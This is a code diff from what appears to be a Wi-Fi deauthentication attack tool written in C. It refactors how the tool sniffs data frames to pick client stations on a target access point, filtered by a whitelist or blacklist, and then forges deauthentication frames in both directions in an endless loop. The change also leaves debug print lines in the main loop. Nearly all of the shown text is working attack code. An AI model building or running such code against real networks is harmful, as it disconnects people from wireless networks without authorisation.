@@ -391,10 +391,18 @@ int is_in_list(uchar *mac)
     return 0;
 }
 
+int is_target_mac(uchar *mac)
+{
+    return with_whitelist ? !is_in_list(mac) : is_in_list(mac);
+}
+
 /* Sniffing Functions */
-uchar *get_target_deauth(uchar *bssid)
+uchar *get_target(uchar *bssid)
 {
     uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
+    uchar *fetched_bssid = NULL;
+    uchar *station_mac = NULL;
+
     // Sniffing for data frames to find targets
     int packet_length = 0;
     while (1)
@@ -402,12 +410,17 @@ uchar *get_target_deauth(uchar *bssid)
         packet_length = 0;
 
         do {
-
             packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
 
+            if (packet_length >= 22) {
+                fetched_bssid = get_macs_from_packet(BSSID, sniffed_packet);
+                station_mac = get_macs_from_packet(STATION, sniffed_packet);
+            }
         } while(
             packet_length < 22 ||
-            memcmp(bssid, get_macs_from_packet(BSSID, sniffed_packet), MAC_LENGTH)
+            memcmp(bssid, fetched_bssid, MAC_LENGTH) ||
+            !memcmp(station_mac, fetched_bssid, MAC_LENGTH) ||
+            !is_target_mac(station_mac)
         );
 
         return sniffed_packet;
@@ -416,35 +429,19 @@ uchar *get_target_deauth(uchar *bssid)
 
 void run_deauth(uchar *bssid, int how_many)
 {
-    uchar * sniffed_packet_data = NULL;
-    uchar * mac_bssid = NULL;
-    uchar * mac_station = NULL;
+    uchar *sniffed_packet_data = NULL;
+    uchar *mac_station = NULL;
     struct packet result_packet;
     int counter = 0;
 
-    while(1)
-    {
-        sniffed_packet_data = get_target_deauth(bssid);
-        mac_station = get_macs_from_packet(STATION, sniffed_packet_data);
-        mac_bssid = get_macs_from_packet(BSSID, sniffed_packet_data);
-
-        if (
-            (with_whitelist == 1 && is_in_list(mac_station)) ||
-            (with_whitelist == 0 && !is_in_list(mac_station)) ||
-            (!memcmp(mac_station, mac_bssid, MAC_LENGTH))
-        ) {
-            continue;
-        }
-        break;
-    }
+    sniffed_packet_data = get_target(bssid);
+    mac_station = get_macs_from_packet(STATION, sniffed_packet_data);
 
     if (verbose) {
         printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
         printf("Expected BSSID: ");
         print_mac(bssid);
         printf("\n---- Frame ----\n");
-        printf("BSSID: ");
-        print_mac(mac_bssid);
         printf("Station: ");
         print_mac(mac_station);
 
@@ -461,7 +458,7 @@ void run_deauth(uchar *bssid, int how_many)
         print_packet(sniffed_packet_data, MAX_PACKET_LENGTH);
     }
 
-    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 1);
+    result_packet = create_deauth_frame(mac_station, bssid, bssid, 1);
 
     if (verbose)
     {
@@ -474,7 +471,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 0);
+    result_packet = create_deauth_frame(mac_station, bssid, bssid, 0);
 
     if (verbose)
     {
@@ -487,7 +484,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 1);
+    result_packet = create_deauth_frame(bssid, mac_station, bssid, 1);
 
     if (verbose)
     {
@@ -500,7 +497,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 0);
+    result_packet = create_deauth_frame(bssid, mac_station, bssid, 0);
 
     if (verbose)
     {
@@ -670,11 +667,12 @@ int main(int argc, const char *argv[])
         }
         printf("---------------------\n");
     }
-    /* Run Forest, run... */
+
     while (1)
     {
+        printf("IIII am here\n");
         run_deauth(bssid, how_many);
-        /* we shall print some statistics */
+        printf("I am here\n");
     }
 
     free(bssid);
